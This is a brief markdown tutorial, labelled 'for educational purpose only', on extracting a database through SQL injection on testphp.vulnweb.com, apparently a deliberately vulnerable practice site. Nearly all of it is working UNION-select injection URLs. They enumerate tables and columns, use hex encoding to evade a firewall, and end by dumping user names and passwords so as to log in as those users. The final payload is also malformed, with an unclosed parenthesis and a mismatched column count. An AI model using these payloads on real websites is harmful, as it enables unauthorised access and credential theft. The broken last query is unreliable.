# "SAMPLE" How to Extract_database_From_Website

# ONLY FOR EDUCATIONAL PURPOSE ONLY

## Get the database of a website and steal the credentials of users from website vulnerability

### Steps to Perform:

* Open the website (http://testphp.vulnweb.com/).
* Select artists→r4w8173
* Add a special character after the URL ( ‘ ). If it shows an error, then the website is vulnerable to SQL Injection. (http://testphp.vulnweb.com/artists.php?artist=1’)
* Find the vulnerable columns of the website using the below commands (http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3) 2 and 3 are vulnerable columns. Let us select column 2.
* Find the database name of the website using the command: (http://testphp.vulnweb.com/artists.php?artist=-1 union select 1, database(), 3)
* Find the table names in the database using the command: (http://testphp.vulnweb.com/artists.php?artist=-1 union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=database())
* Select the user's table to view the user's information.
* Find the columns in a table using the command. Change the user's table name to encoding characters to bypass the firewall by (https://codebeautify.org/string-hex-converter)
* (http://testphp.vulnweb.com/artists.php?artist=-1 union select 1, group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273)
* We need the uname and pass to find the information. (http://testphp.vulnweb.com/artists.php?artist=-1 union select 1, group_concat(uname,0x3a, pass) from users
* Try to login with username and password into the website.
* Done
## Congratulations!


